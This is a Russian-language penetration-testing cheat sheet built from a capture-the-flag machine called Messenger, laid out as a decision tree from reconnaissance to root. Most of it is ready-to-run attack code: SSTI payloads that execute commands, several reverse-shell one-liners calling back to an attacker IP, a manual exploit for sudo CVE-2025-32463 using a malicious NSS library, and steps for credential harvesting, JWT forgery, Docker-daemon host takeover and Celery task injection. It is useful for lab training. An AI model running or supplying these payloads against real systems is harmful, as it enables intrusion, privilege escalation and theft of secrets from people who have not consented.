# Чите-лист по пентесту: техники из машины Messenger

Прохождение машины Messenger до root, оформленное в виде дерева решений. Каждая ветка содержит команду, что искать и куда двигаться дальше.

---

## Уровень 0: Подготовка

Перед чем-либо проверьте связность и DNS.

```bash
ping -c 1 <TARGET>
```

Нет ответа? Либо VPN упал, либо домен не резолвится. Добавьте в hosts:

```bash
echo "<TARGET_IP>  <TARGET_DOMAIN>" | sudo tee -a /etc/hosts
```

---

## Уровень 1: Разведка

### 1.1 Сканирование портов

```bash
nmap -sC -sV -p- --min-rate 1000 <TARGET> -oN nmap_full.txt
```

На что обращать внимание:

| Порт | Сервис | Следующий шаг |
|------|--------|---------------|
| 22 | SSH | Запомнить, может понадобиться для пивота или брутфорса |
| 80/443 | HTTP | Перейти к 1.2 |
| 3000, 5000, 8080, 8443, 9000 | Веб-приложения / API | Перейти к 1.2 на каждом |
| 5432 | PostgreSQL | Проверить, открыт ли наружу |
| 6379 | Redis | Если открыт — крупная находка |
| 15672 | RabbitMQ Management | Бесплатная победа, если открыт |
| 9200 | Elasticsearch | `curl IP:9200/_cat/indices` |
| 27017 | MongoDB | Проверить авторизацию |

Если nmap зависает или фильтруется:

```bash
masscan -p1-65535 --rate=1000 <TARGET>
# или
nc -zv <TARGET> 80 443 3000 8080 6379 15672
```

### 1.2 Фингерпринтинг сервисов

```bash
nmap -sV -p <PORT> <TARGET>
curl -sI http://<TARGET>:<PORT>/
```

Заголовки говорят о многом:

| Заголовок | Значение | Дальше |
|-----------|----------|--------|
| `Server: nginx` | Статика / реверс-прокси | Искать API за ним |
| `Server: gunicorn` | Python WSGI | Flask/FastAPI, вероятно API |
| `X-Powered-By: Express` | Node.js | Express API |
| `Server: Werkzeug` | Dev-сервер Flask | Проверить debug-режим |
| `WWW-Authenticate: Bearer` | JWT-авторизация | Искать openapi.json |

### 1.3 Фаззинг виртуальных хостов

```bash
ffuf -u http://<TARGET>/ -H "Host: FUZZ.<TARGET_DOMAIN>" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
```

Несколько vhost = мультитенантный сервер. Каждый — отдельная поверхность атаки.

### 1.4 Поиск директорий и файлов

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -u http://<TARGET>/FUZZ -fw 158
```

Для SPA (React/Vue) получите кучу ложных срабатываний из-за catch-all маршрута. Фильтруйте по длине:

```bash
gobuster dir -u http://<TARGET>/ -w /usr/share/wordlists/dirb/common.txt \
             -k -t 50 --exclude-length 1125
```

| Найдено | Значение | Дальше |
|---------|----------|--------|
| `swagger`, `openapi.json`, `redoc` | Документация API | Перейти к 1.6 |
| `admin`, `dashboard` | Админ-панель | Тестировать обход авторизации |
| `.git/`, `.env`, `backup.zip` | Чувствительные данные | Скачать немедленно |
| `api/` | Корень API | Фаззить `api/FUZZ` |

### 1.5 Анализ JS-бандлов

SPA прячут весь API-интерфейс в JavaScript-файлах. Разбирайте их.

```bash
# Список JS-файлов
curl -s http://<TARGET>/ | grep -o 'src="[^"]*\.js"' | cut -d'"' -f2

# Скачать основной бандл
curl -s http://<TARGET>/assets/index-XXXX.js -o index.js

# Вытащить эндпоинты
grep -oE '"/api[^"]*"' index.js | sort -u
grep -oE "'/api[^']*'" index.js | sort -u
grep -oE 'baseURL[^,]*' index.js | head -5
```

| Найдено | Значение | Дальше |
|---------|----------|--------|
| `baseURL:"/api/v1"` | Версия API | Тестировать пути под этим |
| `/api/v1/auth/register` | Регистрация | Создать аккаунт |
| `/api/v1/auth/login` | Логин | Получить токен |
| Эндпоинты, которых нет в swagger | **Скрытые маршруты** | Тестировать каждый |
| `"secret"`, `"token"` в JS | Клиентские секреты | Иногда переиспользуются на сервере |

### 1.6 Поиск документации API

```bash
for p in /swagger.json /api/swagger.json /openapi.json /api/openapi.json \
         /swagger /swagger-ui.html /redoc /api/docs /docs; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  echo "$code  $p"
done
```

`200` на `openapi.json` означает, что у вас полная карта API:

```bash
curl -s http://<TARGET>/api/openapi.json -o openapi.json
jq '.paths | keys[]' openapi.json
```

---

## Уровень 2: Анализ приложения

### 2.1 Картирование эндпоинтов

```bash
jq '.paths | keys[]' openapi.json
```

| Паттерн | Гипотеза | Тест |
|---------|----------|------|
| `/api/v1/chats/{chat_id}/messages` | IDOR | Попробовать чужие chat_id |
| `/api/v1/friendships/search` | Перечисление пользователей | Искать популярные имена |
| `/api/v1/friendships/summary` | Если отдаёт HTML — SSTI | См. 2.5 |
| `/api/v1/admin/*` | Нарушение контроля доступа | Тестировать без админ-токена |
| `/api/v1/auth/register` | Создание аккаунта | Зарегистрироваться |

### 2.2 Определение механизма авторизации

```bash
curl -s -i http://<TARGET>/api/v1/<protected>
```

| Ответ | Тип авторизации |
|-------|-----------------|
| `401 + WWW-Authenticate: Bearer` | JWT / Bearer |
| `401 + WWW-Authenticate: Basic` | Basic auth |
| `Set-Cookie: session=...` | Сессионная кука |

Если получили токен, декодируйте payload JWT:

```bash
echo -n "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq
# → {sub: "5", type: "access", iat: ..., exp: ...}
```

`sub` — ID пользователя. `type` — access или refresh. `exp` — срок истечения:

```bash
date -d @<EXP_TIMESTAMP>
```

### 2.3 Регистрация и логин

```bash
curl -s -X POST http://<TARGET>/api/v1/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"hunter1","email":"h@t.com","password":"Passw0rd!","firstName":"H","lastName":"One"}'

TOKEN=$(curl -s -X POST http://<TARGET>/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"hunter1","password":"Passw0rd!"}' | jq -r .access_token)
```

| Ответ | Дальше |
|-------|--------|
| `200 + access_token` | Перейти к 2.4 |
| `404` | Неверный эндпоинт. Свериться со swagger/JS |
| `already exists` | Логин с существующими данными |

### 2.4 Тесты на инъекции

**XSS:**

```bash
curl -s -X POST http://<TARGET>/api/v1/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"<script>alert(1)</script>","email":"x@t.com","password":"Passw0rd!"}'
# Позже проверить, отображается ли payload без экранирования
```

**SQL-инъекция:**

```bash
curl -s "http://<TARGET>/api/v1/friendships/search?search=admin'%20OR%20'1'='1"
# Если меняется количество результатов → инъекция возможна
```

**Path traversal:**

```bash
curl -s "http://<TARGET>/api/v1/files?name=../../../../etc/passwd"
curl -s "http://<TARGET>/api/v1/download?path=..%2F..%2F..%2Fetc%2Fpasswd"
```

**SSRF:**

```bash
curl -s "http://<TARGET>/api/v1/proxy?url=http://127.0.0.1:9732/"
curl -s "http://<TARGET>/api/v1/webhook?url=http://169.254.169.254/latest/meta-data/"
```

### 2.5 Проверка Content-Type

Этот шаг чаще всего пропускают. Делайте его на каждом эндпоинте.

```bash
curl -s -D - http://<TARGET>/api/v1/friendships/summary \
  -H "Authorization: Bearer $TOKEN" -o /dev/null
```

| Content-Type | Значение |
|--------------|----------|
| `application/json` | Обычный API |
| `text/html; charset=utf-8` | **Рендеринг шаблона на сервере** → кандидат на SSTI |

Правило: если API вместо JSON возвращает HTML — на стороне сервера работает шаблонизатор. Тестируйте SSTI на каждом контролируемом поле.

---

## Уровень 3: SSTI (Server-Side Template Injection)

### 3.1 Определение движка

Пробрасывайте математические payload'ы в каждое контролируемое поле. У каждого шаблонизатора свой синтаксис.

| Payload | Движок | Успех = |
|---------|--------|---------|
| `{{7*7}}` | Jinja2 / Twig | `49` |
| `${7*7}` | Mako / JSP EL | `49` |
| `<%= 7*7 %>` | ERB (Ruby) | `49` |
| `{7*7}` | Smarty (PHP) | `49` |
| `[[${7*7}]]` | Thymeleaf (Java) | `49` |
| `#{7*7}` | Интерполяция Ruby | `49` |

Порядок теста:

```bash
# 1. Регистрация с payload в username
curl -s -X POST http://<TARGET>/api/v1/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"${7*7}","email":"t1@t.com","password":"Passw0rd!","firstName":"X","lastName":"Y"}'

# 2. Логин
T=$(curl -s -X POST http://<TARGET>/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"${7*7}","password":"Passw0rd!"}' | jq -r .access_token)

# 3. Отрендерить шаблон
curl -s http://<TARGET>/api/v1/friendships/summary \
  -H "Authorization: Bearer $T" | grep -E 'uid=|49|class='
```

| Результат | Значение |
|-----------|----------|
| `49` | SSTI подтверждён на этом движке |
| `${7*7}` (литерал) | Поле не рендерится, пробуйте другое |
| 500 ошибка | Рендеринг упал, копайте payload |

### 3.2 Поиск рендерящегося поля

В некоторых приложениях `firstName` и `lastName` передаются как переменные шаблона (безопасно), а `username` конкатенируется в исходник шаблона (опасно). Тестируйте поля по отдельности:

```bash
for FIELD in username firstName lastName bio; do
  echo "=== $FIELD ==="
  curl -s -X POST http://<TARGET>/api/v1/auth/register \
    -H 'Content-Type: application/json' \
    -d "{\"$FIELD\":\"\${7*7}\",\"email\":\"t_${FIELD}@t.com\",\"password\":\"Passw0rd!\"}" \
    | jq -r ".$FIELD"
done
```

Поле, вернувшее `49` — уязвимо.

### 3.3 Подтверждение RCE

**Mako:**

```python
${self.module.cache.util.os.popen('id').read()}
${self.module.cache.util.os.popen('whoami').read()}
${self.module.cache.util.os.popen('ls -la').read()}

# Альтернативы
${self._Template__module._util.os.popen('id').read()}
${__import__('os').popen('id').read()}
```

**Jinja2 (для справки):**

```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

Тест:

```bash
curl -s -X POST http://<TARGET>/api/v1/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"${self.module.cache.util.os.popen(\"id\").read()}","email":"rce1@t.com","password":"Passw0rd!","firstName":"X","lastName":"Y"}'

R=$(curl -s -X POST http://<TARGET>/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"${self.module.cache.util.os.popen(\"id\").read()}","password":"Passw0rd!"}' | jq -r .access_token)

curl -s http://<TARGET>/api/v1/friendships/summary \
  -H "Authorization: Bearer $R" | grep -E 'uid=|gid='
```

| Результат | Дальше |
|-----------|--------|
| `uid=1000(app) gid=1001(app)` | RCE подтверждён, идём к 3.4 |
| Пусто | Команда выполнилась без вывода, попробуйте другую |
| 500 | Синтаксис payload'а сломан, поправьте кавычки |

### 3.4 Реверс-шелл

Правила, которые важны:

1. Используйте `bash`, а не `sh`. На Ubuntu `/bin/sh` — это dash, а dash не поддерживает `/dev/tcp`.
2. Ставьте `&` в конец payload'а, чтобы он уходил в фон, иначе curl зависнет.
3. Кодируйте payload в base64, чтобы кавычки и спецсимволы не сломали запрос.
4. Используйте IP с `tun0`, не с `eth0`.

**Bash (предпочтительно):**

```bash
# 1. Слушатель
rlwrap -cAr nc -lvnp 4444

# 2. Собрать payload
PAYLOAD='bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 &'
B64=$(echo -n "$PAYLOAD" | base64 -w0)
echo "$B64"

# 3. Внедрить
# ${self.module.cache.util.os.popen('echo <B64> | base64 -d | bash').read()}
```

**Python (запасной):**

```bash
PAYLOAD="python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

**Netcat / socat:**

```bash
# nc
PAYLOAD='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.5 4444 >/tmp/f'
# socat
PAYLOAD='socat exec:/bin/bash tcp:10.10.14.5:4444'
```

**Perl (редкий запасной):**

```bash
PAYLOAD='perl -e "use Socket;\$i=\"10.10.14.5\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");"'
```

Диагностика:

| Симптом | Причина | Исправление |
|---------|---------|-------------|
| curl зависает | Нет `&` | Добавить `&` в конец |
| curl вернулся, соединения нет | dash, `/dev/tcp` не поддерживается | Использовать `bash` явно или Python payload |
| `Connection refused` | Нет слушателя или порт закрыт | `nc -lvnp` на открытом порту |
| `Permission denied` | Ограничение на путь | Использовать `/tmp` |

**Апгрейд TTY после получения шелла:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Несколько раз Enter в шелле
export TERM=xterm SHELL=/bin/bash
stty rows 40 cols 120
```

---

## Уровень 4: Повышение привилегий

### 4.1 Первичная разведка

```bash
whoami; id; hostname; uname -a; cat /etc/os-release
sudo -V | head -1
sudo -l 2>/dev/null
```

### 4.2 Проверка CVE

| Компонент | Опасная версия | CVE |
|-----------|----------------|-----|
| sudo | `1.9.16p2` или `< 1.9.17p1` | CVE-2025-32463 |
| polkit | `< 0.120` | CVE-2021-4034 (PwnKit) |
| kernel | `< 5.8` | CVE-2022-0847 (Dirty Pipe) |
| kernel | `< 4.8.3` | CVE-2016-5195 (Dirty COW) |

### 4.3-A CVE-2025-32463 (sudo -R + NSS)

Механизм: `sudo -R <chroot>` читает `nsswitch.conf` из chroot и загружает NSS-разделяемую библиотеку до сброса привилегий. Подсовываем злонамеренный `.so`, и его конструктор запускается от root.

Автоматически:

```bash
git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git
cd CVE-2025-32463_chwoot
chmod +x sudo-chwoot.sh
./sudo-chwoot.sh
# → woot! и рутовый шелл
```

Вручную:

```bash
# 1. Собрать злонамеренную NSS-библиотеку
cat > /tmp/woot.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void) {
    setreuid(0,0); setregid(0,0);
    execl("/bin/bash","bash","-p",NULL);
}
EOF
mkdir -p /tmp/stage/libnss_
gcc -shared -fPIC -Wl,-init,woot -o /tmp/stage/libnss_/woot1337.so.2 /tmp/woot.c

# 2. Собрать поддельный chroot
mkdir -p /tmp/stage/woot/etc
echo "passwd: /woot1337" > /tmp/stage/woot/etc/nsswitch.conf
cp /etc/group /tmp/stage/woot/etc/

# 3. Выполнить из каталога stage
cd /tmp/stage && sudo -R woot woot
```

Флаг `-Wl,-init,woot` критичен. Он устанавливает функцию как ELF `DT_INIT`, которую glibc вызывает безусловно при загрузке, тогда как `__attribute__((constructor))` может быть пропущен в зависимости от того, как NSS загружает модуль.

### 4.3-B SUID и capabilities

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

Злоупотребление известными SUID-бинарниками через GTFOBins:

| SUID | Побег |
|------|-------|
| `nmap` | `nmap --interactive` → `!sh` |
| `vim` | `vim -c ':!sh'` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `bash` | `bash -p` |
| `python` | `python -c 'import os;os.setuid(0);os.system("/bin/sh")'` |

### 4.3-C Cron

```bash
cat /etc/crontab; ls -la /etc/cron.*
ps aux | grep cron
find / -type f -perm -o+w 2>/dev/null | grep -E 'cron|\.sh'
```

### 4.4 Файлы с учётными данными

```bash
cat ~/.bash_history ~/.ssh/* 2>/dev/null
find / -name ".env" -o -name "*.config" -o -name "credentials*" 2>/dev/null | grep -v proc
find / -name "*.db" -o -name "*.sqlite*" 2>/dev/null | grep -v proc
```

### 4.5 Альтернативы

| Путь | Триггер |
|------|---------|
| `sudo -l` с любым бинарником | GTFOBins |
| Пользователь в группе `docker` | `docker run -v /:/mnt alpine chroot /mnt /bin/bash` |
| Пользователь в группе `lxd` | Побег из LXC |
| `/etc/passwd` доступен на запись | Добавить пользователя с UID=0 |
| `~/.ssh/authorized_keys` доступен на запись | Добавить свой ключ |

---

## Уровень 5: Охота за учётными данными

### 5.1 Домашние директории

```bash
ls -la /root /home/* 2>/dev/null
find / -name "*.env" -o -name ".env" 2>/dev/null | grep -v proc
```

### 5.2 Конфиги и секреты

```bash
grep -rIl "password\|secret\|token\|api_key" /etc /opt /app /home 2>/dev/null | head -20
```

### 5.3 Git-репозитории на диске

```bash
find / -type d -name ".git" 2>/dev/null
# Любая находка → уровень 6
```

### 5.4 Окружение процессов

```bash
env
cat /proc/1/environ | tr '\0' '\n'
cat /proc/self/environ | tr '\0' '\n'
```

| Файл | Содержимое |
|------|-----------|
| `/root/gitness` | Токен и пароль Gitness |
| `/app/.env` | URL БД, секреты |
| `/etc/hosts`, `/etc/resolv.conf` | Внутренняя сеть, DNS |
| `~/.aws/credentials` | IAM-ключи |
| `~/.docker/config.json` | Авторизация в registry |

Любой файл с токеном или паролем — ключ к следующему сервису.

---

## Уровень 6: Раскопка Git-истории

Секреты, закоммиченные и «удалённые», никуда не деваются. `git rm` не чистит историю — он записывает факт удаления.

### 6.1 Клонирование

```bash
# Basic auth
git clone http://user:pass@host:3000/space/repo.git

# Bearer / PAT
git clone http://oauth2:${TOKEN}@host:3000/space/repo.git

# SSH
git clone ssh://git@host:2222/space/repo.git

# Если только UI — через API zip-экспорт
curl -s "http://host:3000/api/v1/repos/<space>/<repo>/archive/main.zip" \
  -H "Authorization: Bearer $TOKEN" -o repo.zip
```

### 6.2 Перебор истории

```bash
git log --all --oneline                # все коммиты всех веток
git log --all --stat                   # с изменёнными файлами
git log -p --all                       # полные диффы
git branch -a                          # все ветки
git tag                                # все теги
```

### 6.3 Поиск удалённых файлов

```bash
# Удалённые файлы в истории
git log --all --diff-filter=D --name-only --pretty=format:"%H %s"

# Любой когда-либо закоммиченный .env
git log --all --full-history -- .env

# Содержимое конкретного файла в конкретном коммите
git show <COMMIT_SHA>:path/to/.env

# Извлечь первый .env в истории
git show $(git log --all --full-history --format=%H -- .env | head -1):.env
```

### 6.4 Автоматический поиск секретов

```bash
git log -p --all | grep -iE "password|secret|token|api[_-]?key|BEGIN.*PRIVATE"
gitleaks detect --source . --verbose
trufflehog git file://. --only-verified
```

| Найдено | Дальше |
|---------|--------|
| `REFRESH_TOKEN=eyJ...` | Использовать против API |
| `AWS_ACCESS_KEY_ID=...` | `aws sts get-caller-identity` |
| `DATABASE_URL=...` | `psql` / `mysql` |
| `PRIVATE KEY` | Переиспользовать SSH/TLS-ключ |

---

## Уровень 7: Атака API через украденные токены

### 7.1 Определить тип токена

```bash
echo -n "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq
# type: access / refresh / pat
```

### 7.2 Проверить токен

```bash
for ep in /api/v1/user /api/v1/auth/myself /api/v1/auth/me; do
  echo "=== $ep ==="
  curl -s "http://<TARGET>$ep" -H "Authorization: Bearer $TOKEN" -w "\n[HTTP %{http_code}]\n"
done
```

### 7.3 IDOR / BOLA

```bash
# Свой ресурс
curl -s http://<TARGET>/api/v1/chats/6/messages -H "Authorization: Bearer $TOKEN"

# Чужой ресурс
curl -s http://<TARGET>/api/v1/chats/7/messages -H "Authorization: Bearer $TOKEN"
# 200 с данными → IDOR
```

### 7.4 Обмен refresh → access

```bash
curl -s -X POST http://<TARGET>/api/v1/auth/refresh \
  -H "Content-Type: application/json" \
  -d "{\"refresh_token\":\"$REFRESH\"}"

# Или через bearer
curl -s -X POST http://<TARGET>/api/v1/auth/refresh \
  -H "Authorization: Bearer $REFRESH"
```

### 7.5 Подделка JWT (если утёк `JWT_SECRET_KEY`)

```python
import jwt, datetime
payload = {
    "sub": "1",              # admin
    "type": "access",
    "iat": int(datetime.datetime.now().timestamp()),
    "exp": int((datetime.datetime.now() + datetime.timedelta(days=1)).timestamp()),
}
print(jwt.encode(payload, "<LEAKED_JWT_SECRET>", algorithm="HS256"))
```

```bash
curl -s http://<TARGET>/api/v1/admin/users -H "Authorization: Bearer $FORGED"
# 200 → полный админ
```

---

## Уровень 8: Пивот по Docker-сети

### 8.1 Определить подсеть

```bash
hostname -I
ip a
cat /etc/hosts
```

| Диапазон | Значение |
|----------|----------|
| `172.17.x.x` | Docker default bridge |
| `172.18.x.x`–`172.30.x.x` | Пользовательская Docker-сеть |
| `10.x.x.x` | Стандартная сеть или overlay |
| `fd00::` | IPv6 ULA |

### 8.2 Сканирование соседей без nmap

```bash
python3 -c "
import socket
from concurrent.futures import ThreadPoolExecutor
def check(args):
    ip, port = args
    try:
        with socket.socket() as s:
            s.settimeout(0.3)
            if s.connect_ex((ip, port)) == 0:
                print(f'OPEN {ip}:{port}')
    except: pass
base = '172.22.2.'
ports = [22, 80, 443, 2375, 3000, 5000, 5432, 6379, 8000, 8080, 9000, 15672, 27017]
tasks = [(f'{base}{i}', p) for i in range(1,255) for p in ports]
with ThreadPoolExecutor(max_workers=200) as ex:
    list(ex.map(check, tasks))
"
```

### 8.3 Идентификация сервисов

| Порт | Сервис | Тест |
|------|--------|------|
| 2375/2376 | Docker daemon (без TLS) | `curl http://IP:2375/version` → root на хосте |
| 5432 | PostgreSQL | `psql -h IP -U postgres` |
| 6379 | Redis | `redis-cli -h IP` |
| 15672 | RabbitMQ Management | Web UI с учёткой |
| 27017 | MongoDB | `mongo IP:27017` |
| 9200 | Elasticsearch | `curl IP:9200/_cat/indices` |

Если открыт 2375:

```bash
docker -H tcp://IP:2375 ps
docker -H tcp://IP:2375 run -v /:/host alpine chroot /host /bin/bash
# → root на самом хосте
```

---

## Уровень 9: Эксплуатация очередей сообщений

### 9.1 Доступ к RabbitMQ Management

```bash
curl -s -u user:pass http://IP:15672/api/overview | head -c 200
# JSON → учётка верна
# 401 → неверная учётка
```

### 9.2 Найти vhost и очереди

```bash
# vhost
curl -s -u user:pass http://IP:15672/api/vhosts | jq '.[].name'

# очереди на vhost
curl -s -u user:pass http://IP:15672/api/queues/<VHOST> | jq '.[] | {name, consumers, messages}'

# конкретная очередь
curl -s -u user:pass "http://IP:15672/api/queues/<VHOST>/<QUEUE>" | jq '{name, consumers, messages}'
```

| Поле | Значение | Дальше |
|------|----------|--------|
| `consumers >= 1` | Воркер жив | Можно триггерить задачи |
| `consumers = 0` | Воркера нет | Запустить или искать другой путь |
| `messages > 100k` | Очередь забита | Сообщение может задержаться |
| `messages < 1000` | Почти пусто | Быстрая доставка |

### 9.3 Найти формат задачи

Сначала читаем код воркера. Ищите `tasks.py` в Git-репозитории или на диске.

```bash
cat /app/tasks.py
```

Ищите декораторы `@shared_task`:

```python
@shared_task
def send_environment_variables_to_chat(sender_id: int, chat_id: int):
    envs_verbose = "\n".join(f"{k}={v}" for k, v in os.environ.items())
    ...
```

Формат payload'а Celery:

```json
{
  "properties": {
    "content_type": "application/json",
    "content_encoding": "utf-8",
    "delivery_mode": 2,
    "headers": {
      "task": "app.tasks.<TASK_NAME>",
      "id": "<UUID>"
    }
  },
  "routing_key": "<QUEUE_NAME>",
  "payload": "[[<ARG1>, <ARG2>], {}, {\"callbacks\": null, \"errbacks\": null, \"chain\": null, \"chord\": null}]",
  "payload_encoding": "string"
}
```

| Поле | Источник |
|------|----------|
| `task` | Полный путь функции из `tasks.py` |
| `routing_key` | Имя очереди из 9.2 |
| `payload[0]` | Позиционные аргументы в порядке сигнатуры |
| `payload[1]` | Keyword-аргументы (обычно `{}`) |

### 9.4 Сначала подписаться на канал Redis

Pub/Sub не хранит сообщения. Если подписчика нет в момент публикации, сообщение пропадает. Подписывайтесь до триггера.

```python
# /tmp/listen.py
import socket, sys
s = socket.socket()
s.settimeout(120.0)
s.connect(("<REDIS_IP>", 6379))
# SUBSCRIBE <CHANNEL>
s.sendall(b"*2\r\n$9\r\nSUBSCRIBE\r\n$<LEN>\r\n<CHANNEL>\r\n")
while True:
    data = s.recv(65536)
    if not data: break
    sys.stdout.write(data.decode('utf-8', errors='ignore'))
    sys.stdout.flush()
```

Разбор RESP:
- `*2` — массив из 2 элементов
- `$9\r\nSUBSCRIBE` — строка с префиксом длины "SUBSCRIBE"
- `$<LEN>\r\n<CHANNEL>` — имя канала с префиксом длины

```bash
python3 /tmp/listen.py > /tmp/out.txt 2>&1 &
```

### 9.5 Триггер и захват

```bash
curl -s -u user:pass -H "Content-Type: application/json" -X POST \
  --data @payload.json \
  "http://IP:15672/api/exchanges/<VHOST>/amq.default/publish"
# {"routed":true} = опубликовано

sleep 3
grep "FLAG" /tmp/out.txt
```

### 9.6 Альтернативы

| Ситуация | Альтернатива |
|----------|--------------|
| `consumers = 0` | Воркер может стартовать с задержкой; повторить позже |
| Payload отвергнут | Проверить формат Celery v4 vs v5 |
| В Redis есть auth | Искать пароль в env или config |
| UI закрыт | Использовать AMQP напрямую на 5672 через `pika` |

---

## Уровень 10: Пост-эксплуатация

```bash
# Полное окружение процесса
cat /proc/1/environ | tr '\0' '\n'
cat /proc/self/environ | tr '\0' '\n'

# Grep секретов по всей системе
grep -rIl "FLAG\|SECRET\|KEY" /app /opt /etc /home 2>/dev/null | head

# SQLite
sqlite3 /app/data.db ".tables"

# Redis
redis-cli -h <host> KEYS "*"
redis-cli -h <host> GET secret
```

---

## Быстрый чек-лист решений

| Если нашли... | Идти к | Основной инструмент |
|---------------|--------|---------------------|
| `openapi.json` | Уровень 2 | `jq .paths` |
| API отдаёт `Content-Type: text/html` | Уровень 3 | `{{7*7}}`, `${7*7}` |
| SSTI вычисляется | Уровень 3.4 | `os.popen` + реверс-шелл |
| Есть шелл | Уровень 4 | `sudo -V`, `uname -a`, SUID |
| Файл с токеном | Уровень 7 | `curl -H "Authorization: Bearer ..."` |
| Git-репозиторий | Уровень 6 | `git log --all`, gitleaks |
| Внутренний сервис | Уровень 8 | Скан подсети |
| RabbitMQ + Redis + Celery | Уровень 9 | Subscribe, затем publish |
| Утёк `JWT_SECRET_KEY` | Уровень 7.5 | Подделка админ-JWT |

---

## Десять правил

1. Проверяйте `Content-Type` на каждом эндпоинте. HTML от API означает SSTI.
2. Тестируйте каждое поле ввода отдельно. Одно может быть экранировано, другое нет.
3. Кодируйте реверс-шелл в base64. Спецсимволы ломают инлайн.
4. Используйте `bash`, а не `sh`. У dash нет `/dev/tcp`.
5. Добавляйте `&` к реверс-шеллу, иначе curl зависнет.
6. Проходите всю Git-историю. Удалённые файлы живут как блобы.
7. Обменивайте refresh-токен на access. Не предполагайте, что один работает за оба.
8. Сканируйте Docker-подсеть. localhost контейнера — не localhost цели.
9. Подписывайтесь на Pub/Sub канал до триггера публикатора.
10. `consumers: 1` в очереди — доказательство живости воркера. Очередь без консьюмера — чёрная дыра.

---

## Справочник инструментов

| Категория | Инструменты |
|-----------|-------------|
| Разведка | nmap, ffuf, gobuster, feroxbuster |
| API | postman, swagger-editor, kiterunner |
| SSTI | tplmap, payloadsallthethings |
| Шеллы | revshells.com, nc, socat, rlwrap |
| Привилегии | linpeas, LinEnum, pspy, linux-exploit-suggester |
| Git | gitleaks, trufflehog, gitrob |
| Docker | deepce, amicontained |
| JWT | jwt_tool, hashcat |


2016/10/19
